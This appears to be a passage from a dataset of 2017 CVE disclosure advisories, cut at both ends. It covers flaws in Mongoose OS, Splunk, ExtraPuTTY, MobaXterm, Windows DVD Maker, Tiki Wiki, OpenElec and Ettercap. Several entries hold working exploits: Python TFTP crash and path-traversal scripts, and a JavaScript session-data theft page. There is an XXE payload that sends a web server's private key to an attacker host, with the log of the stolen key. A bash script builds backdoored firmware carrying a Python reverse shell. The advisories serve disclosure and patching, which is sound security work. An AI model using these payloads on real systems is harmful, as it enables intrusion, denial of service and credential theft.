if (mg_http_multipart_wait_for_boundary(c) == 0) {
return;
}
break;
}
--------------->8---------------
Then, mg_http_multipart_wait_for_boundary() tries to identify the boundary-string. However, this string has never been initialized, which causes c_strnstr to crash.
---------------8<---------------
static int mg_http_multipart_wait_for_boundary(struct mg_connection *c) {
const char *boundary;
struct mbuf *io = &c->recv_mbuf;
struct mg_http_proto_data *pd = mg_http_get_proto_data(c);
if ((int) io->len < pd->mp_stream.boundary_len + 2) {
return 0;
}
boundary = c_strnstr(io->buf, pd->mp_stream.boundary, io->len);
if (boundary != NULL) {
[CUT BY COMPASS]
--------------->8---------------
Steps to reproduce
-----------------
Request to HTTP server (code running on hardware device):
---------------8<---------------
POST / HTTP/1.1
Connection: keep-alive
Content-Type: multipart/form-data;
Content-Length: 1
1
--------------->8---------------
The above request results in a stack trace on the mongoose console:
---------------8<---------------
Guru Meditation Error of type LoadProhibited occurred on core 0. Exception was unhandled.
Register dump:
PC : 0x400014fd PS : 0x00060330 A0 : 0x801114b4 A1 : 0x3ffbfcf0
A2 : 0x00000000 A3 : 0xfffffffc A4 : 0x000000ff A5 : 0x0000ff00
A6 : 0x00ff0000 A7 : 0xff000000 A8 : 0x00000000 A9 : 0x00000085
A10 : 0xcccccccc A11 : 0x0ccccccc A12 : 0x00000001 A13 : 0x00000000
A14 : 0x00000037 A15 : 0x3ffbb3cc SAR : 0x0000000f EXCCAUSE: 0x0000001c
EXCVADDR: 0x00000000 LBEG : 0x400014fd LEND : 0x4000150d LCOUNT : 0xffffffff
Backtrace: 0x400014fd:0x3ffbfcf0 0x401114b4:0x3ffbfd00 0x401136cc:0x3ffbfd30 0x401149ac:0x3ffbfe30 0x40114b71:0x3ffbff00 0x40112b80:0x3ffc00a0 0x40112dc6:0x3ffc00d0 0x40113295:0x3ffc0100 0x4011361a:0x3ffc0170 0x40111716:0x3ffc01d0 0x40103b8f:0x3ffc01f0 0x40105099:0x3ffc0210
--------------->8---------------
Further debugging shows that an uninitialized string has indeed been passed to c_strnstr:
---------------8<---------------
(gdb) info symbol 0x401114b4
c_strnstr + 12 in section .flash.text
(gdb) list *0x401114b4
0x401114b4 is in c_strnstr (/mongoose-os/mongoose/mongoose.c:1720).
warning: Source file is more recent than executable.
1715 }
1716 #endif /* _WIN32 */
1717
1718 /* The simplest O(mn) algorithm. Better implementation are GPLed */
1719 const char *c_strnstr(const char *s, const char *find, size_t slen) WEAK;
1720 const char *c_strnstr(const char *s, const char *find, size_t slen) {
1721 size_t find_length = strlen(find);
1722 size_t i;
1723
1724 for (i = 0; i < slen; i++) {
(gdb) list *0x401136cc
0x401136cc is in mg_http_multipart_continue (/mongoose-os/mongoose/mongoose.c:5893).
5888 mg_http_free_proto_data_mp_stream(&pd->mp_stream);
5889 pd->mp_stream.state = MPS_FINISHED;
5890
5891 return 1;
5892 }
5893
5894 static int mg_http_multipart_wait_for_boundary(struct mg_connection *c) {
5895 const char *boundary;
5896 struct mbuf *io = &c->recv_mbuf;
5897 struct mg_http_proto_data *pd = mg_http_get_proto_data(c);
(gdb)
--------------->8---------------
Workaround / Fix:
-----------------
Apply the following (tested and confirmed) patch:
---------------8<---------------
$ diff --git a/mongoose/mongoose.c b/mongoose/mongoose.c
index 91dc8b9..063f8c6 100644
--- a/mongoose/mongoose.c
+++ b/mongoose/mongoose.c
@@ -5889,6 +5889,12 @@ static int mg_http_multipart_wait_for_boundary(struct mg_connection *c) {
return 0;
}
+ if(pd->mp_stream.boundary == NULL){
+ pd->mp_stream.state = MPS_FINALIZE;
+ LOG(LL_INFO, (""invalid request: boundary not initialized""));
+ return 0;
+ }
+
boundary = c_strnstr(io->buf, pd->mp_stream.boundary, io->len);
if (boundary != NULL) {
const char *boundary_end = (boundary + pd->mp_stream.boundary_len);
--------------->8---------------
The patch has been merged into Mongoose OS on github.com on 2017-04-03 [4]
Timeline:
---------
2017-04-03: Coordinated public disclosure date
2017-04-03: Release of patch
2017-03-20: Initial vendor response, code usage sign-off
2017-03-19: Initial vendor notification
2017-03-19: Assigned CVE-2017-7185
2017-03-11: Confirmation and patching Philipp Promeuschel, Carel van Rooyen
2017-03-08: Initial inspection Philipp Promeuschel, Carel van Rooyen
2017-03-08: Discovery by Philipp Promeuschel
References:
-----------
[1] https://www.cesanta.com/
[2] https://github.com/cesanta/mongoose/blob/66a96410d4336c312de32b1cf5db954aab9ee2ec/mongoose.c#L7760
[3] http://www.ietf.org/rfc/rfc2046.txt
[4] https://github.com/cesanta/mongoose-os/commit/042eb437973a202d00589b13d628181c6de5cf5b"
1948,Splunk Enterprise Information Theft CVE-2017-5607,,CVE-2017-5607,"[+] Credits: John Page AKA hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/SPLUNK-ENTERPRISE-INFORMATION-THEFT.txt
[+] ISR: ApparitionSec
Vendor:
===============
www.splunk.com
Product:
==================
Splunk Enterprise
Splunk provides the leading platform for Operational Intelligence. Customers use Splunk to search, monitor, analyze
and visualize machine data. Splunk Enterprise, collects and analyzes high volumes of machine-generated data.
Vulnerability Type:
==================================
Javascript (JSON) Information Theft
CVE Reference:
==============
CVE-2017-5607
Security Issue:
================
Attackers can siphon information from Splunk Enterprise if an authenticated Splunk user visits a malicious webpage.
Some useful data gained is the currently logged in username and if remote user setting is enabled. After, the username
can be use to Phish or Brute Force Splunk Enterprise login. Additional information stolen may aid in furthering attacks.
Root cause is the global Window JS variable assignment of config?autoload=1 '$C'.
e.g.
window.$C = {""BUILD_NUMBER"": 207789, ""SPLUNKD_PATH""... etc... }
To steal information we simply can define a function to be called when the '$C' JS property is ""set"" on webpage, for example.
Object.defineProperty( Object.prototype, ""$C"", { set:function(val){...
The Object prototype is a Object that every other object inherits from in JavaScript, if we create a setter on the name of our target
in this case ""$C"", we can get/steal the value of this data, in this case it is very easy as it is assigned to global Window namespace.
Affected Splunk Enterprise versions:
6.5.x before 6.5.3
6.4.x before 6.4.6
6.3.x before 6.3.10
6.2.x before 6.2.13.1
6.1.x before 6.1.13
6.0.x before 6.0.14
5.0.x before 5.0.18 and Splunk Light before 6.5.2
Vulnerability could allow a remote attacker to obtain logged-in username and Splunk version-related information via JavaScript.
References:
=============
https://www.splunk.com/view/SP-CAAAPZ3
https://www.splunk.com/view/SP-CAAAPZ3#InformationLeakageviaJavaScriptCVE20175607
Exploit/POC:
=============
Reproduction:
1) Log into Splunk
2) place the below Javascript in webpage on another server.
""Splunk-Data-Theft.html""
<script>
Object.defineProperty( Object.prototype, ""$C"", { set:function(val){
//prompt(""Splunk Timed out: Please Login to Splunk Username: ""+val.USERNAME, ""Password"")
for(var i in val){
alert(""""+i+"" ""+val[i]);
}
}
});
</script>
<script src=""https://VICTIM-IP:8000/en-US/config?autoload=1""></script>
3) Visit the server hosting the ""Splunk-Data-Theft.html"" webpage, grab current authenticated user
4) Phish or brute force the application.
Video POC URL:
===============
https://vimeo.com/210634562
Network Access:
===============
Remote
Impact:
=======================
Information Disclosure
Severity:
=========
Medium
Disclosure Timeline:
===================================================
Vendor Notification: November 30, 2016
Vendor Acknowledgement: December 2, 2016
Vendor Release Splunk 6.5.3 / Patch : March 30, 2017
March 31, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1974,CVE-2017-7183 ExtraPuTTY v029_RC2 TFTP Denial Of Service,,CVE-2017-7183,"[+] Credits: John Page AKA hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/EXTRAPUTTY-TFTP-DENIAL-OF-SERVICE.txt
[+] ISR: ApparitionSec
Vendor:
==================
www.extraputty.com
Product:
======================
ExtraPuTTY - v029_RC2
hash: d7212fb5bc4144ef895618187f532773
Also Vulnerable: v0.30 r15
hash: eac63550f837a98d5d52d0a19d938b91
ExtraPuTTY is a fork from 0.67 version of PuTTY.
ExtraPuTTY has all the features from the original soft and adds others.
Below a short list of the principal features (see all features):
DLL frontend
TestStand API ( LabWindows ,TestStand 2012)
timestamp
StatusBar
Scripting a session with lua 5.3.
Automatic sequencing of commands.
Shortcuts for pre-defined commands.
Keyboard shortcuts for pre-defined command
Portability (use of directories structure)
Integrates FTP,TFTP,SCP,SFTP,Ymodem,Xmodem transfert protocols
Integrates PuTTYcyg,PuTTYSC, HyperLink, zmodem and session manager projects
Change default settings from configuration file
Change putty settings during session
PuTTYcmdSender : tool to send command or keyboard shortcut to multiple putty windows
Vulnerability Type:
=======================
TFTP Denial of Service
CVE Reference:
==============
CVE-2017-7183
Security Issue:
================
TFTP server component of ExtraPuTTY is vulnerable to remote Denial of Service attack by sending large junk UDP
Read/Write TFTP protocol request packets.
Open ExtraPuTTY Session Manager, select => Files Transfer => TFTP Server, run below Python exploit.
Then, BOOM
(100c.30c): Access violation - code c0000005 (first/second chance not available)
*** ERROR: Symbol file could not be found. Defaulted to export symbols for kernel32.dll -
eax=00000000 ebx=0929ee98 ecx=00000174 edx=7efefeff esi=00000002 edi=00000000
eip=77b4015d esp=0929ee48 ebp=0929eee4 iopl=0 nv up ei pl zr na pe nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246
ntdll!ZwWaitForMultipleObjects+0x15:
Exploit/POC:
=============
import socket
print ""ExtraPuTTY v029_RC2 TFTP Server""
print ""Remote Denial Of Service 0day Exploit""
print ""John Page AKA hyp3rlinx ""
TARGET=raw_input(""[IP]>"")
TYPE=int(raw_input(""[Select DOS Type: Read=1, Write=2]>""))
CRASH=""A""*2000
PORT = 69
if TYPE==1:
PAYLOAD = ""x00x01""
PAYLOAD += CRASH + ""x00""
PAYLOAD += ""netasciix00""
elif TYPE==2:
PAYLOAD = ""x00x02""
PAYLOAD += CRASH + ""x00""
PAYLOAD += ""netasciix00""
try:
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(""x00x01TESTx00 etasciix00"", (TARGET, PORT))
recv = s.recvfrom(255)
if recv != None:
print ""Crashing ExtraPuTTY TFTP server at : %s"" %(TARGET)
s.sendto(PAYLOAD, (TARGET, PORT))
except Exception:
print 'Server not avail, try later'
s.close()
Network Access:
===============
Remote
Severity:
=========
Medium
Disclosure Timeline:
===============================
Vendor Notification: No reply
March 20, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1979,CVE-2017-6805 MobaXterm Personal Edition v9.4 Path Traversal Remote File Disclosure,,CVE-2017-6805,"+] Credits: John Page AKA hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MOBAXTERM-TFTP-PATH-TRAVERSAL
-REMOTE-FILE-ACCESS.txt
[+] ISR: ApparitionSec
Vendor:
=====================
mobaxterm.mobatek.net
Product:
===============================
MobaXterm Personal Edition v9.4
Enhanced terminal for Windows with X11 server, tabbed SSH client, network tools and much more.
Vulnerability Type:
=====================================
Path Traversal Remote File Disclosure
CVE Reference:
==============
CVE-2017-6805
Security Issue:
================
Remote attackers can use UDP socket connection to TFTP server port 69 and send Read request, to retrieve otherwise protected files using
directory traversal attacks e.g. ../../../../Windows/system.ini
Start MobaXterm TFTP server which listens on default TFTP port 69.
c:>tftp -i 127.0.0.1 GET ../../../../Windows/system.ini
Transfer successful: 219 bytes in 1 second(s), 219 bytes/s
c:xampphtdocs>type system.ini
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON
[drivers]
wave=mmdrv.dll
timer=timer.drv
[mci]
Victim Data located on: 127.0.0.1
POC URL:
=============================
https://vimeo.com/207516364
Exploit:
==========
import sys,socket
print 'MobaXterm TFTP Directory Traversal 0day Exploit'
print 'Read Windows/system.ini'
print 'hyp3rlinx '
HOST = raw_input(""[IP]>"")
FILE = 'Windows/system.ini'
PORT = 69
PAYLOAD = ""x00x01"" #TFTP Read
PAYLOAD += ""../"" * 4 + FILE + ""x00"" #Read system.ini using directory traversal
PAYLOAD += ""netasciix00"" #TFTP Type
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(PAYLOAD, (HOST, PORT))
out = s.recv(1024)
s.close()
print ""Victim Data located on : %s "" %(HOST)
print out.strip()
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=============================
Vendor Notification: No Reply
March 10, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1981,CVE-2017-6911: USB Pratirodh Insecure Password Storage Information Disclosure Vulnerability,,CVE-2017-6911,"Vulnerability Title: USB Pratirodh Insecure Password Storage Information Disclosure Vulnerability
Affected Product: USB Pratirodh
Product Homepage: https://cdac.in/index.aspx?id=cs_eps_usb_pra
CVE-ID : CVE-2017-6911
Severity: Medium
Description:
USB Pratirodh is prone to sensitive information disclosure. Its Store sensitive information such as username and password hash in usb.xml file. An attacker with physical access to the system can modify the file according his own requirements that may aid in further attack.
Affected Product:
USB Pratirodh
Credit:
Sachin Wagh (tiger_tigerboy)"
1984,CVE-2017-0045 Windows DVD Maker XML External Entity File Disclosure,,CVE-2017-0045,"[+] Credits: John Page AKA hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-DVD-MAKER-XML-EXTERNAL-ENTITY-FILE-DISCLOSURE.txt
[+] ISR: ApparitionSec
Vendor:
=================
www.microsoft.com
Product:
=================
Windows DVD Maker
v6.1.7
Windows DVD Maker is a feature you can use to make DVDs that you can watch on a computer or on a TV using a regular DVD player.
Vulnerability Type:
=============================
XML External Entity Injection
CVE Reference:
==============
CVE-2017-0045
MS17-020
Security issue:
================
Windows DVD Maker Project "".msdvd"" files are prone to XML External Entity attacks allowing remote attackers to gain access
to files from a victims computer using a specially crafted malicious .msdvd file, resulting in remote information / file disclosures.
POC URL:
=========
https://vimeo.com/208383182
References:
============
https://technet.microsoft.com/library/security/MS17-020
https://support.microsoft.com/en-us/help/3208223/ms17-020-security-update-for-windows-dvd-maker-march-14-2017
Applies to:
Windows Server 2008 R2 Service Pack 1
Windows Server 2008 R2 Datacenter
Windows Server 2008 R2 Enterprise
Windows Server 2008 R2 Standard
Windows Web Server 2008 R2
Windows Server 2008 R2 Foundation
Windows 7 Service Pack 1
Windows 7 Ultimate
Windows 7 Enterprise
Windows 7 Professional
Windows 7 Home Premium
Windows 7 Home Basic
Windows 7 Starter
Windows Server 2008 Service Pack 2
Windows Server 2008 Foundation
Windows Server 2008 Standard
Windows Server 2008 for Itanium-Based Systems
Windows Web Server 2008
Windows Server 2008 Enterprise
Windows Server 2008 Datacenter
Windows Vista Service Pack 2
Windows Vista Home Basic
Windows Vista Home Premium
Windows Vista Business
Windows Vista Ultimate
Windows Vista Enterprise
Windows Vista Starter
Exploit code(s):
===============
Steal XAMPP Web Servers private key ""server.key"".
1) python -m SimpleHTTPServer 8080 (listens on ATTACKER-IP, hosts payload.dtd)
2) ""payload.dtd""
<?xml version=""1.0"" encoding=""UTF-8""?>
<!ENTITY % all ""<!ENTITY send SYSTEM 'http://ATTACKER-IP:8080?%file;'>"">
%all;
3) ""Evil.msdvd""
<?xml version=""1.0""?>
<!DOCTYPE NYHC [
<!ENTITY % file SYSTEM ""C:xamppapacheconfssl.keyserver.key"">
<!ENTITY % dtd SYSTEM ""http://ATTACKER-IP:8080/payload.dtd"">
%dtd;]>
<pwn>&send;</pwn>
RESULT:
XAMPP Web Server private key sent to attacker:
e.g.
C:>python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
127.0.0.1 - - [13/Mar/2017 23:53:36] ""GET /payload.dtd HTTP/1.1"" 200 -
127.0.0.1 - - [13/Mar/2017 23:53:36] ""GET /?-----BEGIN%20RSA%20PRIVATE%20KEY-----MIICXQIBAAKBgQDBJdMn4+ytDYNqbedfmnUQI+KQnaBjlY8dQZpY1ZpjjFtzhpB5zMPWo3m4dbwelHx8buOt0CdcC8YMavkPMv6zxHoQIwQrKSjUqvmzL2YQ+KfBzWDEayhX42c7957NSCLcOOpIE4A6QJdXDEc1Rj1xYpruU51jDmd6KMmkNP8Z7QIDAQABAoGBAJvUs58McihQrcVRdIoaqPXjrei1c/DEepnFEw03EpzyYdo8KBZM0Xg7q2KKgsM9U45lPQZTNmY6DYh5SgYsQ3dGvocvwndq+wK+QsWH8ngTYqYqwUBBCaX3kwgknAc++EpRRVmV0dJMdXt3xAUKSXnDP9fLPdKXffJoG7C1HHVVAkEA+087rR2FLCjdRq/9WhIT/p2U0RRQnMJyQ74chIJSbeyXg8E
ll5QxhSg7skrHSZ0cBPhyaLNDIZkn3NMnK2UqhwJBAMTAsUorHNo4dGpO8y2HE6QXxeuX05OhjiO8H2hmkcuMi2C9OwGIrI+lx1Q8mK261NKJh7sSVwQikh5YQYLKcOsCQQD6YqcChDb7GHvewdmatAhX1ok/Bw6KIPHXrMKdA3s9KkyLaRUbQPtVwBA6Q2brYS1Zhm/3ASQRhZbB3V9ZTSJhAkB772097P5Vr24VcPnZWdbTbG4twwtxWTix5dRa7RY/k55QJ6K9ipw4OBLhSvJZrPBWVm97NUg+wJAOMUXC30ZVAkA6pDgLbxVqkCnNgh2eNzhxQtvEGE4a8yFSUfSktS9UbjAATRYXNv2mAms32aAVKTzgSTapEX9M1OWdk+/yJrJs-----END%20RSA%20PRIVATE%20KEY----- HTTP/1.1"" 301 -
127.0.0.1 - - [13/Mar/2017 23:53:37] ""GET /?-----BEGIN%20RSA%20PRIVATE%20KEY-----MIICXQIBAAKBgQDBJdMn4+ytDYNqbrdfmnUQI+KQnaBjlY8dQZpY1ZxjjFtzhpB5zMPmo4m4dbwelHx8buOt6CdcC8YMavkPMv6zxHoQIwQrKSjUqvmzL2YQ+KfBzWDEayhX42c7957NSCLcOOpIE4A6QJdXDEc1Rj1xYpruU51jDmd6KMmkNP8Z7QIDAQABAoGBAJvUs58McihQrcVRdIoaqPXjrei1c/DEepnFEw03EpzyYdo8KBZM0Xg7q2KKgsM9U45lPQZTNmY6DYh5SgYsQ3dGvocvwndq+wK+QsWH8ngTYqYqwUBBCaX3kwgknAc++EpRRVmV0dJMdXt3xAUKSXnDP9fLPdKXffJoG7C1HHVVAkEA+087rR2FLCjdRq/9WhIT/p2U0RRQnMJyQ74chIJSbeyXg8E
ll5QxhSg7skrHSZ0cBPhyaLNDIZkn3NMnK2UqhwJBAMTAsUorHNo4dGpO8y2HE6QXxeuX05OhjiO8H2hmmcuMi2C9OwGIrI+lx1Q8mK261NKJh7sSVwQikh3YQYiKcOsCQQD6YqcChDb7GHvewdmatAhX1ok/Bw6KIPHXrMKdA3s9KkyLaRUbQPtVwBA6Q2brYS1Zhm/3ASQRhZbB3V9ZTSJhAkB772097P5Vr24VcPnZWdbTbG4twwtxWTix5dRa7RY/k55QJ6K9ipw4OBLhSvJZrPBWVm97NUg+wJAOMUXC30ZVAkA6pDgLbxVqkCnNgh2eNzhxQtvEGE4a8yFSUfSktS9UbjAATRYXNv2mAms32aAVKTzgSTapEX9M1OWdk+/yJrJs-----END%20RSA%20PRIVATE%20KEY-----/ HTTP/1.1"" 200 -
Disclosure Timeline:
=========================================
Vendor Notification: September 3, 2016
Vendor acknowledgement: November 17, 2016
March 14, 2017 : Vendor released MS17-020
March 15, 2017 : Public Disclosure
Network access:
=================
Remote
Severity:
===========
High
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
2003,"CVE-2016-10143: Vulnerability to read arbitrary files in ""Tiki Wiki""",,CVE-2016-10143,"Credits
===============
Zhao Liang, Huawei Weiran Labs
Vendor:
===============
Tiki
Product:
========================
Tiki Wiki CMS
The Tiki Wiki CMS Groupware project (aka TikiWiki or Tiki) is an open source initiative that releases and maintains a powerful OpenSource Content Management System (CMS) and Groupware called Tiki.
Vulnerability Type:
================================
Access Validation Error
CVE Reference:
==============
CVE-2016-10143
Vulnerability Details:
=====================
This vulnerability allows remote users to read arbitrary files on a targeted system via a crafted pathname in the banner URL field of Tiki Wiki.
Exploitation Technique:
=======================
Remote
Severity Level:
===============
High
Best Regards,
Zhao Liang, Huawei Weiran Labs"
2017,OpenElec: Remote Code Execution Vulnerability through Man-In-The-Middle(CVE-2017-6445),,CVE-2017-6445,"During my research about update mechanisms of open-source software I
discovered vulnerabilities in OpenElec.
== [ OVERVIEW ] ==
System affected: OpenElec
CVE: CVE-2017-6445
Vulnerable component: auto-update feature
Software-Version: 6.0.3, 7.0.1
User-Interaction: Reboot required
Impact: Remote Code Execution with root permission
== [ PRODUCT DESCRIPTION ] ==
According to its website ""Open Embedded Linux Entertainment Center
(OpenELEC) is a small Linux based Just Enough Operating System (JeOS)
built from scratch as a platform to turn your computer into a Kodi media
center.""
== [ VULNERABILITY ] ==
Automatic updates are disabled by default. After enabling it, OpenElec
connects to http://update.openelec.tv/updates.php to find out if there
is an update for a newer version. If there is a newer version, openelec
will download it from http://releases.openelec.tv/<version>.tar(or any
other url returned by update.openelec.tv).
The auto-update feature of OpenElec does neither use encrypted
connections nor does it use signed updates. A Man-In-The-Middle could
manipulate the update-packages to gain root-access remotely.
In order to run the downloaded firmware, the OpenElec-system has to be
rebooted. So at this point user-interaction is required.
== [ EXPLOIT ] ==
The following code downloads an openelec-firmware, extracts it, places a
reverse-shell into the kodi-startscript and finally generates a
backdoored firmware:
#!/bin/bash
OPENELEC=""OpenELEC-RPi2.arm-7.0.1""
DOWNLOADURL=""http://releases.openelec.tv/""
TMP=""/tmp""
cd $TMP
test -e ${OPENELEC}.tar || wget $DOWNLOADURL/${OPENELEC}.tar
test -d $OPENELEC || tar xvf ${OPENELEC}.tar
test -d $TMP/unpacked || mkdir $TMP/unpacked
cd $TMP/unpacked
test -d $TMP/unpacked/squashfs-root || unsquashfs
$TMP/$OPENELEC/target/SYSTEM
cat > $TMP/unpacked/squashfs-root/usr/bin/revshell.sh << EOF
#!/bin/bash
while true
do
python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.12.32.15"",5000));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);' > /dev/null 2>&1
done
EOF
chmod 777 $TMP/unpacked/squashfs-root/usr/bin/revshell.sh
awk '/trap cleanup TERM/ { print; print ""/usr/bin/revshell.sh &""; next
}1' $TMP/unpacked/squashfs-root/usr/lib/kodi/kodi.sh >
$TMP/unpacked/squashfs-root/usr/lib/kodi/kodievil.sh
mv $TMP/unpacked/squashfs-root/usr/lib/kodi/kodievil.sh
$TMP/unpacked/squashfs-root/usr/lib/kodi/kodi.sh
chmod 777 $TMP/unpacked/squashfs-root/usr/lib/kodi/kodi.sh
mksquashfs squashfs-root/ SYS -noappend -comp gzip
mv SYS $TMP/$OPENELEC/target/SYSTEM
cd $TMP/$OPENELEC
md5sum target/SYSTEM > target/SYSTEM.md5
cd $TMP
tar cvf $OPENELEC.evil.tar $OPENELEC
test -d $TMP/unpacked && rm -fr $TMP/unpacked
test -d $OPENELEC && rm -rf $OPENELEC
== [ MITIGATION ] ==
Ensure that auto-update is disabled.
== [ Timeline ] ==
* This bug was reported on December 03 2016.
* Published as Zero-Day after no reply from OpenElec on March 04 2017
== [ CREDITS ] ==
CVE-2017-6445 was discovered by Wolfgang Hotwagner
(https://tech.feedyourhead.at/content/openelec-remote-code-execution-vulnerability-through-man-in-the-middle)"
2018,CVE-2017-6430: Out-of-Bounds Read (DOS) Vulnerability in Ettercap Etterfilter utility,,CVE-2017-6430,"Document Title:
===============
CVE-2017-6430: Out-of-Bounds Read (DOS) Vulnerability in Ettercap Etterfilter utility
Vendor:
=======
Ettercap (http://ettercap.github.io/ettercap/)
Product and Versions Affected:
==============================
Etterfilter 0.8.2 and possibly prior.
Vulnerability Type:
===================
Denial-of-Service
CVE Reference:
==============
CVE-2017-6430
Vulnerability Details:
======================
Etterfilter utility of Ettercap have an out-of-bounds read denial-of-service vulnerability when parsing a crafted file. This occurs in the compile_tree function of the ef_compiler.c source file when processing corrupted filters.
Valgrind Output:
================
raras@ubuntu:~/Desktop$ valgrind etterfilter ~/Desktop/crash
==25860== Memcheck, a memory error detector
==25860== Copyright (C) 2002-2013, and GNU GPL'd, by Julian Seward et al.
==25860== Using Valgrind-3.10.1 and LibVEX; rerun with -h for copyright info
==25860== Command: etterfilter /home/raras/Desktop/crash
==25860==
etterfilter 0.8.2 copyright 2001-2015 Ettercap Development Team
14 protocol tables loaded:
DECODED DATA udp tcp esp gre icmp ipv6 ip arp wifi fddi tr eth
13 constants loaded:
VRRP OSPF GRE UDP TCP ESP ICMP6 ICMP PPTP PPPOE IP6 IP ARP
Parsing source file '/home/raras/Desktop/crash' done.
BUG at [/home/raras/Desktop/ettercap-master/utils/etterfilter/ef_compiler.c:compile_tree:242]
tree_root == NULL
==25860== Invalid read of size 8
==25860== at 0x4E4D7B9: clean_exit (in /usr/local/lib/libettercap.so.0.0.0)
==25860== by 0x4030B0: compile_tree (in /usr/local/bin/etterfilter)
==25860== by 0x4042D3: write_output (in /usr/local/bin/etterfilter)
==25860== by 0x4024BD: main (in /usr/local/bin/etterfilter)
==25860== Address 0x6bc2440 is 8 bytes after a block of size 24 alloc'd
==25860== at 0x4C2CC70: calloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
==25860== by 0x4041A2: globals_alloc (in /usr/local/bin/etterfilter)
==25860== by 0x4023AF: main (in /usr/local/bin/etterfilter)
==25860==
==25860== Invalid read of size 8
==25860== at 0x4E4D7BD: clean_exit (in /usr/local/lib/libettercap.so.0.0.0)
==25860== by 0x4030B0: compile_tree (in /usr/local/bin/etterfilter)
==25860== by 0x4042D3: write_output (in /usr/local/bin/etterfilter)
==25860== by 0x4024BD: main (in /usr/local/bin/etterfilter)
==25860== Address 0x0 is not stack'd, malloc'd or (recently) free'd
==25860==
==25860==
==25860== Process terminating with default action of signal 11 (SIGSEGV)
==25860== Access not within mapped region at address 0x0
==25860== at 0x4E4D7BD: clean_exit (in /usr/local/lib/libettercap.so.0.0.0)
==25860== by 0x4030B0: compile_tree (in /usr/local/bin/etterfilter)
==25860== by 0x4042D3: write_output (in /usr/local/bin/etterfilter)
==25860== by 0x4024BD: main (in /usr/local/bin/etterfilter)
==25860== If you believe this happened as a result of a stack
==25860== overflow in your program's main thread (unlikely but
==25860== possible), you can try to increase the size of the
==25860== main thread stack using the --main-stacksize= flag.
==25860== The main thread stack size used in this run was 8388608.
==25860==
==25860== HEAP SUMMARY:
==25860== in use at exit: 29,146 bytes in 536 blocks
==25860== total heap usage: 644 allocs, 108 frees, 199,745 bytes allocated
==25860==
==25860== LEAK SUMMARY:
==25860== definitely lost: 8 bytes in 1 blocks
==25860== indirectly lost: 0 bytes in 0 blocks
==25860== possibly lost: 0 bytes in 0 blocks
==25860== still reachable: 29,138 bytes in 535 blocks
==25860== suppressed: 0 bytes in 0 blocks
==25860== Rerun with --leak-check=full to see details of leaked memory
==25860==
==25860== For counts of detected and suppressed errors, rerun with: -v
==25860== ERROR SUMMARY: 2 errors from 2 contexts (suppressed: 0 from 0)
Segmentation fault
Patch:
======
utils/etterfilter/ef_compiler.c
@@ -239,7 +239,9 @@ size_t compile_tree(struct filter_op **fop)
struct filter_op *array = NULL;
struct unfold_elm *ue;
- BUG_IF(tree_root == NULL);
+ // invalid file
+ if (tree_root == NULL)
+ return 0;
fprintf(stdout, "" Unfolding the meta-tree "");
fflush(stdout);


References and Fix:
===================
https://github.com/Ettercap/ettercap/issues/782
https://github.com/LocutusOfBorg/ettercap/commit/626dc56686f15f2dda13c48f78c2a666cb6d8506
Vulnerability Disclosure Timeline:
==================================
2017-02-07: Bug Report Submission & Coordination
2017-03-05: Public Disclosure
Credit:
=======
AromalUllas"
2019,CVE-2017-6429: Buffer overflow vulnerability in Tcpreplay tcpcapinfo utility,,CVE-2017-6429,"Document Title:
===============
CVE-2017-6429: Buffer overflow vulnerability in Tcpreplay tcpcapinfo utility
Vendor:
=======
Appneta (https://www.appneta.com/)
Product and Versions Affected:
==============================
